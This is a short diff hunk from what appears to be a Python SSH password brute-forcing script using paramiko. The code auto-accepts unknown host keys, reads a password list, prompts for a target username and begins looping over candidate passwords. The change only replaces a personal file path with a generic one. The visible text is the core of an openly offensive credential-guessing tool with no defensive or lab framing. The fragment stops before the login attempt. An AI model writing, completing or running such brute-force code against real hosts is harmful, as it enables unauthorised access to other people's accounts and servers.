@@ -31,7 +31,7 @@ try:
             def BruteForce():
                 SSHconn = paramiko.SSHClient()
                 SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                with open(r'C:\Users\Black\Documents\Password lists\Passwords.txt', "r") as f:
+                with open(r'C:\example\Password lists\Passwords.txt', "r") as f:
                     user = input("Please enter the username: ")
                     try:
                         for p in f:
